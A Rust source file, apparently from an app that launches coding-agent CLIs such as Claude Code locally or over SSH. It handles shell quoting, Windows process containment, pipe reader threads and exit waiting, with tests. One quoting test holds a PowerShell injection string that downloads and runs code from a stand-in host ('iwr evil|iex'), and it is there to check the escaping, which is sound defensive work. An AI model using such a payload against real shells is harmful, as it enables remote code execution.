//! Plumbing shared by the coding-agent CLIs Nyxs drives as child processes (Claude Code and the
//! other vendors' CLIs in `agent_cli.rs`): where they work, and the threads around their pipes.

use super::*;

/// A CLI's process: here, or on the remote machine of an `ssh://` project.
pub(crate) enum CliChild {
    Local(Child),
    Remote(crate::remote::procs::RemoteHandle),
}

impl CliChild {
    /// `Some(code)` once it ended, like `Child::try_wait` with the status reduced to its code.
    pub(crate) fn try_wait(&mut self) -> std::io::Result<Option<Option<i32>>> {
        match self {
            CliChild::Local(c) => c.try_wait().map(|s| s.map(|s| s.code())),
            CliChild::Remote(h) => Ok(h.try_wait()),
        }
    }

    pub(crate) fn kill_tree(&mut self) {
        match self {
            CliChild::Local(c) => kill_tree(c),
            CliChild::Remote(h) => h.kill(),
        }
    }
}

/// Where the native installers put a CLI. They only advise adding it to the PATH, so a login shell
/// there often can't find what they installed.
pub(crate) const REMOTE_CLI_PATH_POSIX: &str =
    r#"export PATH="$HOME/.local/bin:$HOME/.claude/local:$PATH""#;
pub(crate) const REMOTE_CLI_PATH_PS: &str = r#"$env:Path = "$HOME\.local\bin;$env:Path""#;

/// `'a b'` for a POSIX shell, `'a b'` with doubled quotes for PowerShell. PowerShell also ends a
/// single-quoted string at the typographic quotes U+2018–U+201B, so those are doubled too: text
/// like "don’t" (or a repo's NYXS.md in the system prompt) can't close the string and run the rest.
pub(crate) fn quote(arg: &str, powershell: bool) -> String {
    if powershell {
        let mut out = String::with_capacity(arg.len() + 2);
        out.push('\'');
        for c in arg.chars() {
            if matches!(c, '\'' | '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}') {
                out.push(c);
            }
            out.push(c);
        }
        out.push('\'');
        out
    } else {
        format!("'{}'", arg.replace('\'', "'\\''"))
    }
}

/// Starts a CLI (`claude`, `codex`...) in a remote project's folder, through the user's login
/// shell there so the PATH of their profile finds it. It must be installed and signed in on
/// that machine.
pub(crate) fn spawn_remote_cli(
    cwd: &crate::remote::RemotePath,
    program: &str,
    args: &[String],
    env: &HashMap<String, String>,
) -> Result<crate::remote::procs::RemoteChild, String> {
    let info = crate::remote::info(&cwd.host).map_err(String::from)?;
    let ps = info.os == "windows";
    let quoted: Vec<String> = args.iter().map(|a| quote(a, ps)).collect();
    let command = if ps {
        format!("{REMOTE_CLI_PATH_PS}; & {program} {}", quoted.join(" "))
    } else {
        format!(
            "{REMOTE_CLI_PATH_POSIX}; exec {program} {}",
            quoted.join(" ")
        )
    };
    crate::remote::procs::spawn(
        &cwd.host,
        crate::remote::procs::Spawn {
            command: Some(&command),
            argv: None,
            cwd: Some(&cwd.path),
            env: Some(env),
            stdin: true,
            interactive: true,
        },
    )
    .map_err(String::from)
}

/// Starts a helper Nyxs owns whole (an MCP or language server, the PDF browser, git): on
/// Windows inside the agent's job, so it and what it starts end with Nyxs even when Nyxs ends
/// without its normal exit (a crash, a forced close, the updater). Without a console window.
pub(crate) fn spawn_contained(cmd: &mut Command) -> std::io::Result<Child> {
    #[cfg(windows)]
    return super::job::spawn_contained(cmd);
    #[cfg(not(windows))]
    return cmd.spawn();
}

/// Starts an agent CLI or Claude Code tied to Nyxs: on Windows it ends with Nyxs however Nyxs
/// ends, while what it starts (a dev server, a browser it opened) is left as a normal exit leaves
/// it.
pub(crate) fn spawn_tied(cmd: &mut Command) -> std::io::Result<Child> {
    let child = cmd.spawn()?;
    tie_to_app(child.id());
    Ok(child)
}

#[cfg(all(test, windows))]
pub(crate) use super::job::in_agent_job;

/// `spawn_tied` for a process started some other way (a terminal's shell).
pub(crate) fn tie_to_app(pid: u32) {
    #[cfg(windows)]
    super::job::tie_to_app(pid);
    #[cfg(not(windows))]
    let _ = pid;
}

/// Writes queued lines to the CLI in order. Ends, closing the CLI's stdin, when the queue's
/// sender is dropped or a write fails.
pub(crate) fn spawn_stdin_writer<W: Write + Send + 'static>(
    mut stdin: W,
) -> std::sync::mpsc::Sender<Vec<u8>> {
    let (tx, rx) = std::sync::mpsc::channel::<Vec<u8>>();
    std::thread::spawn(move || {
        for payload in rx {
            if stdin
                .write_all(&payload)
                .and_then(|_| stdin.flush())
                .is_err()
            {
                break;
            }
        }
    });
    tx
}

/// Hands each non-empty line to `on_line` until the process closes the stream. Keeps reading
/// even when nobody is listening: a CLI whose output nobody drains would block mid-turn.
pub(super) fn spawn_line_reader<R: Read + Send + 'static>(
    reader: R,
    mut on_line: impl FnMut(String) + Send + 'static,
) -> std::thread::JoinHandle<()> {
    std::thread::spawn(move || {
        let mut buf = BufReader::new(reader);
        let mut raw: Vec<u8> = Vec::new();
        loop {
            raw.clear();
            match buf.read_until(b'\n', &mut raw) {
                Ok(0) | Err(_) => break,
                Ok(_) => {}
            }
            let line = String::from_utf8_lossy(&raw)
                .trim_end_matches(['\n', '\r'])
                .to_string();
            if !line.is_empty() {
                on_line(line);
            }
        }
    })
}

/// The folder a CLI works in: the project's, or without one a folder of its own under
/// `~/.nyxs/<folder>` (per account), never Nyxs' install dir.
pub(super) fn run_cwd(requested: Option<&str>, folder: &str) -> Result<PathBuf, String> {
    if let Some(dir) = requested.filter(|d| !d.trim().is_empty()) {
        return Ok(PathBuf::from(dir));
    }
    let dir = account_scoped(home_dir()?.join(".nyxs")).join(folder);
    fs::create_dir_all(&dir).map_err(|e| format!("Couldn't create {}: {e}", dir.display()))?;
    Ok(dir)
}

/// How long the exit waits, once the process ended, for the readers to hand over its last lines.
pub(super) const EXIT_DRAIN_GRACE: Duration = Duration::from_millis(1500);

/// Waits until every reader has finished, at most `grace`. A reader can outlive its process for
/// good: a grandchild that inherited the pipe (an installer's background helper, a daemon the CLI
/// starts) keeps it open, and joining that reader would hang.
pub(super) fn await_readers<'a>(
    readers: impl IntoIterator<Item = &'a std::thread::JoinHandle<()>> + Clone,
    grace: Duration,
) {
    let started = Instant::now();
    while !readers.clone().into_iter().all(|r| r.is_finished()) && started.elapsed() < grace {
        std::thread::sleep(Duration::from_millis(20));
    }
}

/// A process's stream read to its end on its own thread, into a buffer that can be taken before
/// the end comes (see `await_readers`).
pub(super) struct StreamCapture {
    text: Arc<Mutex<Vec<u8>>>,
    reader: std::thread::JoinHandle<()>,
}

impl StreamCapture {
    pub(super) fn start<R: Read + Send + 'static>(mut stream: R) -> Self {
        let text = Arc::new(Mutex::new(Vec::new()));
        let sink = text.clone();
        let reader = std::thread::spawn(move || {
            let mut chunk = [0u8; 8192];
            loop {
                match stream.read(&mut chunk) {
                    Ok(0) | Err(_) => break,
                    Ok(n) => sink
                        .lock()
                        .unwrap_or_else(|e| e.into_inner())
                        .extend_from_slice(&chunk[..n]),
                }
            }
        });
        Self { text, reader }
    }

    pub(super) fn reader(&self) -> &std::thread::JoinHandle<()> {
        &self.reader
    }

    /// What was read so far. A reader still waiting on a pipe a grandchild holds is let go.
    pub(super) fn take(self) -> String {
        String::from_utf8_lossy(&self.text.lock().unwrap_or_else(|e| e.into_inner())).into_owned()
    }
}

/// What one look at the process found: still running, ended with this code, or it couldn't be
/// asked (the lock was poisoned or the OS call failed), which counts as ended without a code.
type ExitPoll = Result<Option<Option<i32>>, ()>;

/// Polls until the process ends, then waits for both readers to finish (at most `grace`), so
/// the exit is reported after the output and not in the middle of it.
fn wait_for_exit(
    mut poll: impl FnMut() -> ExitPoll,
    readers: &[std::thread::JoinHandle<()>],
    grace: Duration,
) -> Option<i32> {
    let code = loop {
        match poll() {
            Ok(Some(code)) => break code,
            Ok(None) => std::thread::sleep(Duration::from_millis(30)),
            Err(()) => break None,
        }
    };
    await_readers(readers, grace);
    code
}

/// Waits on its own thread for the CLI to end and its stdout/stderr readers to drain, then
/// calls `on_exit` with its exit code (None when it has none, or couldn't be asked).
pub(super) fn spawn_exit_waiter(
    child: Arc<Mutex<CliChild>>,
    readers: [std::thread::JoinHandle<()>; 2],
    on_exit: impl FnOnce(Option<i32>) + Send + 'static,
) -> std::thread::JoinHandle<()> {
    std::thread::spawn(move || {
        let poll = || match child.lock().map(|mut c| c.try_wait()) {
            Ok(Ok(state)) => Ok(state),
            _ => Err(()),
        };
        on_exit(wait_for_exit(poll, &readers, EXIT_DRAIN_GRACE));
    })
}

/// A program that prints "hi" and exits at once, leaving a grandchild that holds its stdout and
/// stderr open for about 30 seconds: what a CLI that starts a daemon, or an installer that
/// leaves a helper running, looks like to its pipes.
#[cfg(test)]
pub(super) fn exits_leaving_a_grandchild() -> (PathBuf, [&'static str; 2]) {
    #[cfg(target_os = "windows")]
    return (
        PathBuf::from("cmd.exe"),
        ["/c", "start /b ping -n 31 127.0.0.1 >nul & echo hi"],
    );
    #[cfg(not(target_os = "windows"))]
    return (PathBuf::from("sh"), ["-c", "sleep 30 & echo hi"]);
}

/// How long a run of `exits_leaving_a_grandchild` may take without having waited for the
/// grandchild. Far below its 30 seconds and the 20-second probe timeout, yet far above a normal
/// run: with the grandchild living 5 seconds and a 4-second limit, a busy CI runner failed it.
#[cfg(test)]
pub(super) const GRANDCHILD_LIMIT: std::time::Duration = std::time::Duration::from_secs(12);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn powershell_quote_doubles_every_single_quote_kind() {
        assert_eq!(quote("a'b", true), "'a''b'");
        assert_eq!(quote("don\u{2019}t", true), "'don\u{2019}\u{2019}t'");
        assert_eq!(
            quote("\u{2018}; iwr evil|iex; \u{201B}", true),
            "'\u{2018}\u{2018}; iwr evil|iex; \u{201B}\u{201B}'"
        );
        assert_eq!(quote("it's", false), "'it'\\''s'");
    }

    #[cfg(windows)]
    fn waits_then_starts_a_child() -> Command {
        // The second ping starts a second in, well after the process was tied.
        let mut cmd = Command::new("cmd");
        cmd.args([
            "/c",
            "ping -n 2 127.0.0.1 >nul && ping -n 30 127.0.0.1 >nul",
        ])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null());
        hide_console(&mut cmd);
        cmd
    }

    #[cfg(windows)]
    fn later_child_of(pid: u32) -> u32 {
        let started = Instant::now();
        loop {
            let kids = super::super::job::children_of(pid);
            if let Some(&kid) = kids
                .last()
                .filter(|_| started.elapsed() > Duration::from_millis(1500))
            {
                return kid;
            }
            assert!(
                started.elapsed() < Duration::from_secs(10),
                "no child started"
            );
            std::thread::sleep(Duration::from_millis(50));
        }
    }

    #[cfg(windows)]
    #[test]
    fn a_tied_process_ends_with_the_app_but_what_it_starts_doesnt() {
        let child = spawn_tied(&mut waits_then_starts_a_child()).unwrap();
        assert!(super::super::job::tied_to_app(child.id()));
        let kid = later_child_of(child.id());
        assert!(!super::super::job::tied_to_app(kid));
        assert!(!super::super::job::in_agent_job(kid));
        CliChild::Local(child).kill_tree();
    }

    #[cfg(windows)]
    #[test]
    fn a_contained_helper_takes_what_it_starts_along() {
        let child = spawn_contained(&mut waits_then_starts_a_child()).unwrap();
        assert!(super::super::job::in_agent_job(child.id()));
        let kid = later_child_of(child.id());
        assert!(super::super::job::in_agent_job(kid));
        CliChild::Local(child).kill_tree();
    }

    #[test]
    fn hands_over_what_was_read_when_the_pipe_never_closes() {
        let (reader, mut writer) = std::io::pipe().unwrap();
        writer.write_all(b"hola").unwrap();
        let capture = StreamCapture::start(reader);
        let started = Instant::now();
        await_readers([capture.reader()], Duration::from_millis(300));
        assert!(started.elapsed() < Duration::from_secs(2));
        assert_eq!(capture.take(), "hola");
        drop(writer);
    }

    fn finished_reader() -> std::thread::JoinHandle<()> {
        let r = std::thread::spawn(|| {});
        while !r.is_finished() {
            std::thread::sleep(Duration::from_millis(1));
        }
        r
    }

    #[test]
    fn reports_the_code_once_the_process_ends() {
        let mut polls = 0;
        let poll = || {
            polls += 1;
            Ok(if polls < 3 { None } else { Some(Some(7)) })
        };
        let code = wait_for_exit(
            poll,
            &[finished_reader(), finished_reader()],
            EXIT_DRAIN_GRACE,
        );
        assert_eq!(code, Some(7));
    }

    #[test]
    fn an_exit_without_a_code_or_a_failed_poll_is_none() {
        assert_eq!(
            wait_for_exit(|| Ok(Some(None)), &[finished_reader()], EXIT_DRAIN_GRACE),
            None
        );
        assert_eq!(
            wait_for_exit(|| Err(()), &[finished_reader()], EXIT_DRAIN_GRACE),
            None
        );
    }

    #[test]
    fn waits_for_the_readers_to_drain_the_last_output() {
        let slow = std::thread::spawn(|| std::thread::sleep(Duration::from_millis(150)));
        let started = Instant::now();
        let code = wait_for_exit(
            || Ok(Some(Some(0))),
            &[finished_reader(), slow],
            EXIT_DRAIN_GRACE,
        );
        assert_eq!(code, Some(0));
        assert!(
            started.elapsed() >= Duration::from_millis(140),
            "returned before the reader finished"
        );
    }

    #[test]
    fn gives_up_on_a_reader_that_never_ends_after_the_grace() {
        // A pipe held open by a grandchild the CLI left behind: the exit still gets reported.
        let stuck = std::thread::spawn(|| std::thread::sleep(Duration::from_secs(5)));
        let started = Instant::now();
        let code = wait_for_exit(|| Ok(Some(Some(1))), &[stuck], Duration::from_millis(100));
        assert_eq!(code, Some(1));
        let waited = started.elapsed();
        assert!(
            waited >= Duration::from_millis(100) && waited < Duration::from_secs(2),
            "waited {waited:?}"
        );
    }

    #[test]
    fn the_waiter_reports_a_real_process_exit_on_its_thread() {
        let child = if cfg!(windows) {
            Command::new("cmd").args(["/C", "exit 3"]).spawn()
        } else {
            Command::new("sh").args(["-c", "exit 3"]).spawn()
        }
        .expect("start a shell");
        let (tx, rx) = std::sync::mpsc::channel();
        let waiter = spawn_exit_waiter(
            Arc::new(Mutex::new(CliChild::Local(child))),
            [finished_reader(), finished_reader()],
            move |code| tx.send(code).unwrap(),
        );
        assert_eq!(rx.recv_timeout(Duration::from_secs(10)).unwrap(), Some(3));
        waiter.join().unwrap();
    }
}
